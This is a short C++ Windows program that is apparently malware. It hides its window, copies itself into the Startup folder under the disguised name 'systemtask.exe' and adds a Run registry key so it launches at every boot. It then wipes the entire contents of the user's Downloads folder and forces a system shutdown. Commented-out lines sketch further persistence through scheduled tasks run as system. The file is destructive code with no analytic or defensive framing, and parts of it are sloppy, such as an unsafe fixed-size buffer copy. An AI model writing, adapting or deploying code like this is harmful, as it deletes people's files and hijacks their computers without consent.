#include "Header.h"


int APIENTRY wWinMain(HINSTANCE Instance, //no window
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {

	char* userdatapath = getenv("APPDATA"); //get %appdata% path
	std::string datapath;
	datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
	char filename[MAX_PATH] = "systemtask.exe";
	char newLocation[77];
	strcpy(newLocation, datapath.c_str());

	if (std::filesystem::exists(datapath + "\\systemtask.exe") != true) { //exit if genesis.exe exists in dir
		std::filesystem::copy(filename, newLocation);
        //std::filesystem::copy(filename, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
		//BOOL stats = 0;
		//DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); //copies itself to starup folder
		//if (size)
			//CopyFileA(filename, newLocation, stats);
	}
	char* userpath = getenv("USERPROFILE"); //get %userprofile% path
	std::string path;
	
	if (userpath != nullptr) {
		path = std::string(userpath) + "\\Downloads"; //sets full directory path

	}
	//removes files under dir recusivly
	void deleteDirectoryContents(const std::string & path); {
		for (const auto& entry : std::filesystem::directory_iterator(path)) { 

			std::filesystem::remove_all(entry.path());

		}
	}
	
	HANDLE hToken = NULL;
	LUID luid;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken); //gives current process shutdown priv
	LookupPrivilegeValue(L"", SE_SHUTDOWN_NAME, &luid);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);
	
	//****NOT IMPLEMENTED****
    
	//STARTUPINFOA lpStartupInfo;
    //PROCESS_INFORMATION lpProcessInformation;
    //char buf[MAX_PATH] = "cmd /c schtasks.exe /create /sc onstart /tn \"APP\" /tr \"C:\\Users\\genesis.exe\" /rl highest";
    //CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &lpStartupInfo, &lpProcessInformation);
    
	//****NOT IMPLEMENTED****
	
	//system("cmd /c schtasks.exe /create /f /sc onlogon /tn \"SYSTEMPROCESS\" /tr \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemtask.exe\" /ru system /rl highest");
	
	//creates registry key for autostart
	std::wstring progPath = L"%APPDATA%\\Microsoft\\Start Menu\\Programs\\Startup\\systemtask.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);       
	LONG status = RegSetValueEx(hkey, L"SYSTEMTASK", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
    
	//****NOT IMPLEMENTED****

	//ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 
        //SHTDN_REASON_MINOR_OTHER);
	
	InitiateSystemShutdownExA(NULL,NULL,0,true, false, SHTDN_REASON_MINOR_OTHER); //shuts down computer
	return 0;
}